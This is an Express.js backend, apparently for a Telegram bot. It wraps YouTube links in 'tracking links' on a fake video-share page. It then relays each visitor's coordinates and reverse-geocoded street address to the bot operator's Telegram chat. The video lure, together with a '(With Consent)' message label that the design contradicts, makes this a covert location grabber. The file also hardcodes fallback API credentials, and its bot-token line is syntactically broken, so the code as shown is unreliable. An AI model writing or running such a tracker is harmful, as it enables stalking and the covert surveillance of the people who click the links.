const express = require('express');
const axios = require('axios');
const cors = require('cors'); 
const app = express();

app.use(cors());
app.use(express.json());

// Aapka GitHub repository path
const GITHUB_PAGES_URL = 'https://saiq123341-create.github.io/-video-share-bot';

// Testing aur hosting dono ke liye token config
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || HzOVHuc9rRfNpiLZIk';
const GEOCODE_API_KEY = process.env.GEOCODE_API_KEY || '6a5bb6dec8d47064344344ezpa215ba';

// 1. Bot se URL lekar trackable URL banana
app.post('/bot/generate-link', (req, res) => {
    const { chat_id, youtube_url } = req.body;
    
    const videoIdMatch = youtube_url.match(/(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/shorts\/)([^?& \n]+)/);
    const videoId = videoIdMatch ? videoIdMatch[1] : '';

    if (!videoId) {
        return res.status(400).json({ error: 'Invalid YouTube URL' });
    }

    const trackingLink = `${GITHUB_PAGES_URL}/index.html?chat_id=${chat_id}&video_id=${videoId}`;
    res.json({ tracking_link: trackingLink });
});

// 2. Location data lekar bot par message trigger karna
app.post('/api/report-location', async (req, res) => {
    const { chat_id, lat, lon } = req.body;

    if (!chat_id || !lat || !lon) {
        return res.status(400).send('Missing data');
    }

    try {
        const geocodeUrl = `https://geocode.maps.co/reverse?lat=${lat}&lon=${lon}&api_key=${GEOCODE_API_KEY}`;
        const geoResponse = await axios.get(geocodeUrl);
        const addressData = geoResponse.data.display_name || "Location found but address unavailable";

        const telegramMessage = `📍 *New Location Received (With Consent)*\n\n` +
                                `• *Coordinates:* \`${lat}, ${lon}\`\n` +
                                `• *Address:* ${addressData}`;

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: chat_id,
            text: telegramMessage,
            parse_mode: 'Markdown'
        });

        res.status(200).send('Success');
    } catch (error) {
        console.error('Error handling location update:', error.message);
        res.status(500).send('Server Error');
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Backend is running on port ${PORT}`));
